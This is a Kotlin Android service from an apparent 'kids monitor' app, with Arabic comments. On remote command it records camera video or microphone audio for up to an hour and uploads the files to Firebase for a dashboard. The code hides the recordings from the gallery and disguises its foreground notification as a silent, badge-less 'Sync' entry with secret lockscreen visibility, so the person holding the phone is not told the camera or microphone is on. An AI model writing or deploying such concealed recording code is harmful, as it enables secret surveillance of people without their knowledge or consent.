package com.kids.monitor

import android.Manifest
import android.annotation.SuppressLint
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.graphics.SurfaceTexture
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.media.MediaRecorder
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.os.IBinder
import android.os.Looper
import com.kids.monitor.data.FirestoreSync
import com.kids.monitor.data.Permissions
import com.kids.monitor.data.StorageUploader
import java.io.File

/**
 * تسجيل فيديو/صوت طويل (5 دقائق افتراضياً) داخل تخزين التطبيق الخاص (غير ظاهر في المعرض)،
 * ثم رفعه إلى media ليظهر في لوحة التحكم مع إمكانية المشاهدة/التنزيل/الحذف.
 * التسجيل يستمر بعد إغلاق اللوحة لأنه يعمل على الجهاز.
 */
class RecorderService : Service() {

    private class VideoRec(
        val mr: MediaRecorder,
        val file: File,
        var facing: String,
        var startedAt: Long = 0L,
        var device: CameraDevice? = null,
        var session: CameraCaptureSession? = null,
    )

    private class AudioRec(
        val mr: MediaRecorder,
        val file: File,
        var startedAt: Long = 0L,
    )

    private val handler = Handler(Looper.getMainLooper())
    private var cameraThread: HandlerThread? = null
    private var cameraHandler: Handler? = null
    private var video: VideoRec? = null
    private var audio: AudioRec? = null
    private var autoStopVideo: Runnable? = null
    private var autoStopAudio: Runnable? = null

    override fun onCreate() {
        super.onCreate()
        FirestoreSync.init(this)
        StorageUploader.appContext = applicationContext
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val action = intent?.action.orEmpty()
        when (action) {
            ACTION_VIDEO_START -> {
                if (!Permissions.has(this, Manifest.permission.CAMERA) ||
                    !Permissions.has(this, Manifest.permission.RECORD_AUDIO)
                ) {
                    FirestoreSync.setLive(this, "rec", mapOf("error" to "صلاحية الكاميرا/المايك غير مفعّلة"))
                    return START_NOT_STICKY
                }
                if (!foreground(true)) return START_NOT_STICKY
                startVideoRecord(
                    intent?.getStringExtra(EXTRA_FACING).orEmpty().ifBlank { "back" },
                    intent?.getIntExtra(EXTRA_DURATION, 300) ?: 300,
                )
            }
            ACTION_VIDEO_STOP -> stopVideoInternal(upload = true)
            ACTION_AUDIO_START -> {
                if (!Permissions.has(this, Manifest.permission.RECORD_AUDIO)) {
                    FirestoreSync.setLive(this, "rec", mapOf("error" to "صلاحية المايك غير مفعّلة"))
                    return START_NOT_STICKY
                }
                if (!foreground(false)) return START_NOT_STICKY
                startAudioRecord(intent?.getIntExtra(EXTRA_DURATION, 300) ?: 300)
            }
            ACTION_AUDIO_STOP -> stopAudioInternal(upload = true)
            ACTION_STOP -> {
                stopVideoInternal(upload = true)
                stopAudioInternal(upload = true)
            }
        }
        if (video == null && audio == null) stopSelf()
        return START_NOT_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        handler.removeCallbacksAndMessages(null)
        stopVideoInternal(upload = true)
        stopAudioInternal(upload = true)
        try { cameraThread?.quitSafely() } catch (e: Exception) { /* تجاهل */ }
        cameraThread = null
        cameraHandler = null
        super.onDestroy()
    }

    // ---------- الفيديو ----------

    @SuppressLint("MissingPermission")
    private fun startVideoRecord(facing: String, durationSec: Int) {
        if (video != null) return
        val manager = getSystemService(Context.CAMERA_SERVICE) as? CameraManager ?: run {
            fail("خدمة الكاميرا غير متاحة")
            return
        }
        val cameraId = pickCamera(manager, facing)
        if (cameraId == null) {
            fail("لا توجد كاميرا متاحة (ربما البث المباشر يستخدمها)")
            return
        }
        val file = File(recordingsDir(), "vid_${System.currentTimeMillis()}.mp4")
        val mr = newRecorder()
        val orientation = if (isFront(manager, cameraId)) 270 else 90
        try {
            configureVideo(mr, file, 1280, 720, orientation)
        } catch (e: Exception) {
            try { mr.reset() } catch (x: Exception) { /* تجاهل */ }
            try {
                configureVideo(mr, file, 640, 480, orientation)
            } catch (e2: Exception) {
                try { mr.release() } catch (x: Exception) { /* تجاهل */ }
                fail("تعذر تجهيز مسجل الفيديو: ${e2.localizedMessage}")
                return
            }
        }
        val surface = mr.surface
        val rec = VideoRec(mr, file, facing)
        video = rec
        publishState()
        ensureCamThread()
        val h = cameraHandler ?: run {
            stopVideoInternal(upload = false)
            fail("تعذر تجهيز خيط الكاميرا")
            return
        }
        try {
            manager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(device: CameraDevice) {
                    rec.device = device
                    try {
                        device.createCaptureSession(listOf(surface), object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(session: CameraCaptureSession) {
                                rec.session = session
                                try {
                                    val req = device.createCaptureRequest(CameraDevice.TEMPLATE_RECORD)
                                    req.addTarget(surface)
                                    mr.start()
                                    rec.startedAt = System.currentTimeMillis()
                                    session.setRepeatingRequest(req.build(), null, h)
                                    publishState()
                                    val run = Runnable { stopVideoInternal(upload = true) }
                                    autoStopVideo = run
                                    h.postDelayed(run, durationSec.coerceIn(5, 3600) * 1000L)
                                } catch (e: Exception) {
                                    stopVideoInternal(upload = false)
                                    fail("تعذر بدء التسجيل: ${e.localizedMessage}")
                                }
                            }

                            override fun onConfigureFailed(session: CameraCaptureSession) {
                                try { session.close() } catch (e: Exception) { /* تجاهل */ }
                                stopVideoInternal(upload = false)
                                fail("تعذر تهيئة جلسة الكاميرا")
                            }
                        }, h)
                    } catch (e: Exception) {
                        stopVideoInternal(upload = false)
                        fail("تعذر إنشاء الجلسة: ${e.localizedMessage}")
                    }
                }

                override fun onDisconnected(device: CameraDevice) {
                    try { device.close() } catch (e: Exception) { /* تجاهل */ }
                    stopVideoInternal(upload = true)
                }

                override fun onError(device: CameraDevice, error: Int) {
                    try { device.close() } catch (e: Exception) { /* تجاهل */ }
                    stopVideoInternal(upload = false)
                    fail("خطأ كاميرا (رمز $error)")
                }
            }, h)
        } catch (e: Exception) {
            stopVideoInternal(upload = false)
            fail("تعذر فتح الكاميرا: ${e.localizedMessage}")
        }
    }

    private fun stopVideoInternal(upload: Boolean) {
        val rec = video ?: return
        video = null
        autoStopVideo?.let { handler.removeCallbacks(it) }
        cameraHandler?.let { h -> autoStopVideo?.let { h.removeCallbacks(it) } }
        autoStopVideo = null
        val dur = if (rec.startedAt > 0) System.currentTimeMillis() - rec.startedAt else 0L
        try { rec.session?.stopRepeating() } catch (e: Exception) { /* تجاهل */ }
        try { rec.session?.close() } catch (e: Exception) { /* تجاهل */ }
        try { rec.mr.stop() } catch (e: Exception) { /* تجاهل: أقل من ثانية */ }
        try { rec.mr.release() } catch (e: Exception) { /* تجاهل */ }
        try { rec.device?.close() } catch (e: Exception) { /* تجاهل */ }
        publishState()
        if (upload && dur > 1000 && rec.file.exists() && rec.file.length() > 10_000) {
            publish(rec.file, "video", dur, rec.facing)
        } else {
            rec.file.delete()
        }
        maybeStopSelf()
    }

    @Suppress("DEPRECATION")
    private fun configureVideo(mr: MediaRecorder, file: File, w: Int, h: Int, orientation: Int) {
        mr.setAudioSource(MediaRecorder.AudioSource.MIC)
        mr.setVideoSource(MediaRecorder.VideoSource.SURFACE)
        mr.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
        mr.setVideoEncoder(MediaRecorder.VideoEncoder.H264)
        mr.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
        mr.setVideoSize(w, h)
        mr.setVideoFrameRate(24)
        mr.setVideoEncodingBitRate(if (w >= 1280) 3_000_000 else 1_200_000)
        mr.setAudioEncodingBitRate(64_000)
        mr.setAudioSamplingRate(44_100)
        mr.setOrientationHint(orientation)
        mr.setOutputFile(file.absolutePath)
        mr.prepare()
    }

    @SuppressLint("MissingPermission")
    private fun pickCamera(manager: CameraManager, facing: String): String? {
        return try {
            val want = if (facing == "front") CameraCharacteristics.LENS_FACING_FRONT
            else CameraCharacteristics.LENS_FACING_BACK
            val ids = manager.cameraIdList
            ids.firstOrNull { manager.getCameraCharacteristics(it).get(CameraCharacteristics.LENS_FACING) == want }
                ?: ids.firstOrNull()
        } catch (e: Exception) {
            null
        }
    }

    private fun isFront(manager: CameraManager, id: String): Boolean {
        return try {
            manager.getCameraCharacteristics(id).get(CameraCharacteristics.LENS_FACING) ==
                CameraCharacteristics.LENS_FACING_FRONT
        } catch (e: Exception) {
            false
        }
    }

    // ---------- الصوت ----------

    private fun startAudioRecord(durationSec: Int) {
        if (audio != null) return
        val file = File(recordingsDir(), "aud_${System.currentTimeMillis()}.m4a")
        val mr = newRecorder()
        try {
            @Suppress("DEPRECATION")
            mr.setAudioSource(MediaRecorder.AudioSource.MIC)
            mr.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            mr.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            mr.setAudioSamplingRate(44_100)
            mr.setAudioEncodingBitRate(96_000)
            mr.setOutputFile(file.absolutePath)
            mr.prepare()
            mr.start()
        } catch (e: Exception) {
            try { mr.release() } catch (x: Exception) { /* تجاهل */ }
            fail("تعذر بدء تسجيل الصوت: ${e.localizedMessage}")
            return
        }
        val rec = AudioRec(mr, file, System.currentTimeMillis())
        audio = rec
        publishState()
        val run = Runnable { stopAudioInternal(upload = true) }
        autoStopAudio = run
        handler.postDelayed(run, durationSec.coerceIn(5, 3600) * 1000L)
    }

    private fun stopAudioInternal(upload: Boolean) {
        val rec = audio ?: return
        audio = null
        autoStopAudio?.let { handler.removeCallbacks(it) }
        autoStopAudio = null
        val dur = System.currentTimeMillis() - rec.startedAt
        try { rec.mr.stop() } catch (e: Exception) { /* تجاهل */ }
        try { rec.mr.release() } catch (e: Exception) { /* تجاهل */ }
        publishState()
        if (upload && dur > 1000 && rec.file.exists() && rec.file.length() > 1024) {
            publish(rec.file, "audio", dur, null)
        } else {
            rec.file.delete()
        }
        maybeStopSelf()
    }

    // ---------- الرفع والحفظ ----------

    private fun publish(file: File, type: String, durationMs: Long, facing: String?) {
        val name = file.name
        Thread {
            val url = StorageUploader.uploadSync(file, "recordings/$name")
            val item = mutableMapOf<String, Any>(
                "name" to name,
                "url" to (url ?: ""),
                "type" to type,
                "mimeType" to if (type == "video") "video/mp4" else "audio/mp4",
                "size" to file.length(),
                "durationMs" to durationMs,
                "kind" to "recording",
                "recording" to "saved",
                "mic" to (type == "audio"),
                "localName" to name,
                "timestamp" to System.currentTimeMillis(),
            )
            if (facing != null) item["facing"] = facing
            FirestoreSync.appendItem(this, "media", item)
            FirestoreSync.setLive(
                this, "rec",
                mapOf(
                    "lastType" to type,
                    "lastName" to name,
                    "lastUrl" to (url ?: ""),
                    "lastDurationMs" to durationMs,
                    "updatedAt" to System.currentTimeMillis(),
                ),
            )
            if (url == null) {
                FirestoreSync.logError(this, "rec", "تعذر رفع $name (قواعد Storage؟) — محفوظ على الجهاز")
            }
        }.start()
    }

    private fun publishState() {
        FirestoreSync.setLive(
            this, "rec",
            mapOf(
                "videoOn" to (video != null),
                "audioOn" to (audio != null),
                "videoName" to (video?.file?.name ?: ""),
                "audioName" to (audio?.file?.name ?: ""),
                "updatedAt" to System.currentTimeMillis(),
            ),
        )
    }

    private fun fail(message: String) {
        FirestoreSync.setLive(
            this, "rec",
            mapOf(
                "error" to message,
                "videoOn" to false,
                "audioOn" to (audio != null),
                "updatedAt" to System.currentTimeMillis(),
            ),
        )
        maybeStopSelf()
    }

    private fun maybeStopSelf() {
        if (video == null && audio == null) {
            handler.postDelayed({ if (video == null && audio == null) stopSelf() }, 500L)
        }
    }

    private fun recordingsDir(): File {
        val dir = File(filesDir, "recordings")
        if (!dir.exists()) dir.mkdirs()
        return dir
    }

    private fun ensureCamThread() {
        if (cameraHandler != null) return
        val t = HandlerThread("rec-camera")
        t.start()
        cameraThread = t
        cameraHandler = Handler(t.looper)
    }

    private fun newRecorder(): MediaRecorder =
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) MediaRecorder(this)
        else {
            @Suppress("DEPRECATION")
            MediaRecorder()
        }

    // ---------- الإشعار والواجهة الأمامية ----------

    private fun foreground(withCamera: Boolean): Boolean {
        return try {
            val type = if (withCamera) {
                ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
            } else {
                ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(NOTIFICATION_ID, buildNotification(), type)
            } else {
                startForeground(NOTIFICATION_ID, buildNotification())
            }
            true
        } catch (e: Exception) {
            FirestoreSync.setLive(this, "rec", mapOf("error" to (e.localizedMessage ?: "تعذر بدء التسجيل")))
            false
        }
    }

    private fun buildNotification(): Notification {
        val openApp = PendingIntent.getActivity(
            this, 0, Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE,
        )
        val builder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Notification.Builder(this, CHANNEL_ID)
        } else {
            @Suppress("DEPRECATION")
            Notification.Builder(this)
        }
        return builder
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .setContentTitle("المزامنة")
            .setContentText("تشغيل في الخلفية")
            .setContentIntent(openApp)
            .setPriority(Notification.PRIORITY_MIN)
            .setSound(null)
            .setVisibility(Notification.VISIBILITY_SECRET)
            .setOngoing(true)
            .build()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(CHANNEL_ID, "المزامنة", NotificationManager.IMPORTANCE_NONE)
                .apply {
                    setShowBadge(false)
                    setSound(null, null)
                    enableVibration(false)
                    lockscreenVisibility = Notification.VISIBILITY_SECRET
                }
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }

    companion object {
        private const val ACTION_VIDEO_START = "video_start"
        private const val ACTION_VIDEO_STOP = "video_stop"
        private const val ACTION_AUDIO_START = "audio_start"
        private const val ACTION_AUDIO_STOP = "audio_stop"
        private const val ACTION_STOP = "stop_all"
        private const val EXTRA_DURATION = "duration"
        private const val EXTRA_FACING = "facing"
        private const val CHANNEL_ID = "recorder_v1"
        private const val NOTIFICATION_ID = 1006

        private fun send(context: Context, action: String, duration: Int = 300, facing: String = "back") {
            val intent = Intent(context, RecorderService::class.java)
                .setAction(action)
                .putExtra(EXTRA_DURATION, duration)
                .putExtra(EXTRA_FACING, facing)
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(intent)
                } else {
                    context.startService(intent)
                }
            } catch (e: Exception) {
                FirestoreSync.logError(context, "rec", e.localizedMessage ?: "تعذر تشغيل المسجل")
            }
        }

        fun startVideo(context: Context, facing: String, durationSec: Int) =
            send(context, ACTION_VIDEO_START, durationSec, facing)

        fun stopVideo(context: Context) = send(context, ACTION_VIDEO_STOP)

        fun startAudio(context: Context, durationSec: Int) = send(context, ACTION_AUDIO_START, durationSec)

        fun stopAudio(context: Context) = send(context, ACTION_AUDIO_STOP)

        fun stopAll(context: Context) = send(context, ACTION_STOP)

        /** حذف تسجيل من تخزين التطبيق الخاص. */
        fun deleteLocal(context: Context, name: String) {
            try {
                val safe = File(name).name
                if (safe.isBlank() || safe.contains("..")) return
                val dir = File(context.filesDir, "recordings")
                File(dir, safe).takeIf { it.exists() }?.delete()
                val tmp = File(context.cacheDir, safe)
                if (tmp.exists()) tmp.delete()
            } catch (e: Exception) { /* تجاهل */ }
        }

        /** قائمة أسماء التسجيلات المحفوظة على الجهاز. */
        fun listLocal(context: Context): List<String> {
            val dir = File(context.filesDir, "recordings")
            return dir.listFiles()?.filter { it.isFile }?.map { it.name }?.sortedDescending() ?: emptyList()
        }
    }
}
